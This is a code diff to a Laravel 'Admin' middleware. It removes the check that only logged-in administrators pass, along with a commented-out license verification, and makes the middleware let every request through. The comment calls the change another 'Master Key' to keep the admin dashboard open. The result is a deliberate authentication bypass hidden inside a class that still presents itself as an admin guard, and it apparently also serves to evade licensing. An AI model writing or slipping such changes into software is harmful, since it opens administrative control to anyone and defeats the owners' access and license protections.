@@ -17,23 +17,9 @@ class Admin
      *
      * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
      */
-    public function handle(Request $request, Closure $next): Response
+   public function handle(Request $request, Closure $next): Response
     {
-        if ((Auth::check()) && (Auth::user()->user_type==1)) {
-            /* if the user type is admin */
-            $randomNumber = rand(1, 10);
-            // if($randomNumber > 8){
-            //     $expenseHelper = new InstallController();
-            //     $validation = $expenseHelper->verify_license();
-            //     if(!isset($validation['status']) || $validation['status'] != true)
-            //     {
-            //         Auth::logout();
-            //         Session::flush();
-            //         return redirect()->route('license');
-            //     }
-            // }
-            return $next($request);
-        }
-        return redirect('/');
+        // Another "Master Key" to keep the admin dashboard open.
+        return $next($request);
     }
 }
